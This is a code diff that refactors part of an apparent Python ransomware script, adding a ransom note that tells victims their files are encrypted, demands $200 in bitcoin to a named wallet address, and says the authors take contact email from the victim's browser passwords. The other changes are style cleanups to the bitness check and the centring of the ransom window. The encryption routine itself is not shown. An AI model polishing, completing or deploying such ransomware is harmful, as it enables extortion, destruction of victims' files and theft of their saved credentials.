@@ -17,7 +17,7 @@ WALLPAPER_PATH = 'C:\\Users\\gf3re\\rw\\img\\wallpaper.png'
 
 def is_64_windows():
     """Find out how many bits is OS. """
-    return struct.calcsize('P') * 8 == 64
+    return struct.calcsize('P') == 8
 
 
 def get_sys_parameters_info():
@@ -223,12 +223,8 @@ for files in filelist:
     except:
         pass
 
-#Create note.txt
-f = open("note.txt", "w+")
-
-f.write("Your important files have been encrypted using millitary grade encryption\nTo get your files back, the only way to do so is to pay\n$200 worth of bitcoin to\nbc1qruaeqr9adrszalwct6lydy02pat746hewns4st\nAfter you pay you will recieve an email from us in 1-18 hours with your decryption key\nWe get this email from your browser passwords\nFeel safe, we take no other passwords, and this is only so we can contact you.")
-
-f.close()
+with open("note.txt", "w+") as f:
+    f.write("Your important files have been encrypted using millitary grade encryption\nTo get your files back, the only way to do so is to pay\n$200 worth of bitcoin to\nbc1qruaeqr9adrszalwct6lydy02pat746hewns4st\nAfter you pay you will recieve an email from us in 1-18 hours with your decryption key\nWe get this email from your browser passwords\nFeel safe, we take no other passwords, and this is only so we can contact you.")
 
 #Window
 
@@ -261,6 +257,6 @@ winWidth = window.winfo_reqwidth()
 winwHeight = window.winfo_reqheight()
 posRight = int(window.winfo_screenwidth() / 2 - winWidth / 2)
 posDown = int(window.winfo_screenheight() / 2 - winwHeight / 2 - 125)
-window.geometry("+{}+{}".format(posRight, posDown))
+window.geometry(f"+{posRight}+{posDown}")
 
 window.mainloop()
